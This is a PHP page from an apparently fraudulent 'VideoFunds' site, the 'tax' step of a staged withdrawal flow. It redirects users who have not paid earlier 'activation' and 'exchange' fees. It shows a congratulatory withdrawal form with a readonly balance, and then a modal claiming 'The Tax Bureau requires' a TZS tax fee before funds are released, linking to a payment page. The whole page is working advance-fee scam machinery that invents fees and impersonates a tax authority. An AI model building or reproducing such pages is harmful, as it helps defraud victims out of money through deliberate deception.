<?php
require_once __DIR__.'/flow_common.php';
$user=sb_require_user(); $uid=(string)$user['id']; $profile=sb_profile($uid);
if (!vf_stage_paid($profile,'activation')) { header('Location: endpay.php'); exit; }
if (!vf_stage_paid($profile,'exchange')) { header('Location: '.(vf_has_draft($profile)?'exchange.php':'index-exchange.php')); exit; }
if (!vf_has_draft($profile)) { header('Location: index-exchange.php'); exit; }
if (vf_stage_paid($profile,'tax')) { header('Location: confirmation1.php'); exit; }
vf_flow_update($uid,['withdrawal_flow_stage'=>'tax']);
$name=vf_display_name($profile,$user);
$method=(string)($profile['wd_method']??'phone');
$account=(string)($profile['wd_account']??'');
$accountLabel=['phone'=>'Phone Number:','visa'=>'Card Number:','paypal'=>'PayPal Email:'][$method]??'Phone Number:';
$accountShown=$method==='visa'?('**** **** **** '.substr(preg_replace('/\D+/','',$account),-4)):$account;
$feeText=number_format(vf_stage_amounts()['tax'],0,'.',',');
$pageTitle='VideoFunds — Tax';
require __DIR__.'/flow-header.php';
?>
<main class="flow-content">
  <?= vf_balance_line($profile) ?>
  <h1>Congratulations! Your Amount has been Exchanged and ready for Withdrawal</h1>
  <p class="dear">Dear <?= vf_esc($name) ?></p>
  <p class="message" style="margin-bottom:0">Your Withdrawal Request</p>
  <form class="flow-card" id="withdrawForm" onsubmit="return false;">
    <label for="amount">Amount (USD):</label>
    <input type="text" id="amount" value="<?= number_format((float)$profile['wd_amount'],2) ?>" readonly>
    <label for="account"><?= vf_esc($accountLabel) ?></label>
    <input type="text" id="account" value="<?= vf_esc($accountShown) ?>" readonly>
    <button type="button" class="flow-btn red" id="confirmBtn">Confirm</button>
  </form>
</main>
<div id="successModal" class="flow-modal" role="dialog" aria-modal="true" aria-labelledby="taxTitle">
  <div class="flow-modal-content">
    <h3 id="taxTitle">TAX FEE PAYMENT!!</h3>
    <p>Dear <?= vf_esc($name) ?>, The Tax Bureau requires that you need Complete Payment of<strong>TAX FEE</strong> that prevent your Withdrawal to be completed.<br><br>
    You're required to <strong>Pay for TAX FEE</strong> of <strong>TZS <?= $feeText ?></strong> in order to receive your withdrawal successfully.</p>
    <a href="paymentmethod.php?stage=tax" class="flow-btn red">Close</a>
  </div>
</div>
<script>
var modal=document.getElementById('successModal');
document.getElementById('confirmBtn').addEventListener('click',function(){modal.classList.add('show');});
window.addEventListener('click',function(e){if(e.target===modal)modal.classList.remove('show');});
</script>
<?php require __DIR__.'/flow-footer.php'; ?>